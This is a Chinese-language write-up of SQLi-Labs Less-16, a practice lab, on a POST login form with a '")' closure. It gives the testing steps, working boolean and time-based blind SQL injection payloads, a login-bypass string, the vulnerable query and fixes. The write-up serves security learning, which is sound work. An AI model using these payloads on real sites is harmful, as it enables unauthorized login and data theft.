# SQLi-Labs | Less-16 POST ") 布尔/时间盲注
## 一、漏洞简介
POST登录表单注入，参数被 `("$uname")` 包裹，闭合符号为 `")`。页面无报错，只返回两张图片，支持布尔盲注、时间盲注。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-16/
注入类型：POST、字符型、")闭合、布尔盲注、时间盲注
## 三、复现步骤
1. BP抓包，获取POST参数uname、passwd。
2. 测试闭合：uname填入 `admin")`，提交，页面切换图片，确认闭合方式。
3. 布尔测试：
   - `uname=admin") and 1=1 --+` 成功图
   - `uname=admin") and 1=2 --+` 失败图
4. 使用substr+if逐字符猜解数据；布尔特征弱的时候改用sleep时间盲注。
## 四、Payload
布尔盲注：
`uname=") and substr(database(),1,1)='s' --+ & passwd=1`
时间盲注：
`uname=") and if(substr(database(),1,1)='s',sleep(3),1) --+ & passwd=1`
绕过登录：
`uname=admin") --+ & passwd=123`
## 五、漏洞原理
后端SQL语句：
`SELECT * FROM users WHERE username=("$uname") AND password=("$passwd")`
输入直接拼接，关闭错误回显，仅根据查询结果返回图片，无任何数据回显。
## 六、修复方案
1. 使用参数化预编译查询。
2. 统一登录返回信息，消除页面差异。
3. 限流，禁用sleep等延时函数。
## 七、总结
Less16和Less15逻辑完全一致，仅仅闭合符号改成 `")`，是盲注的巩固练习关卡。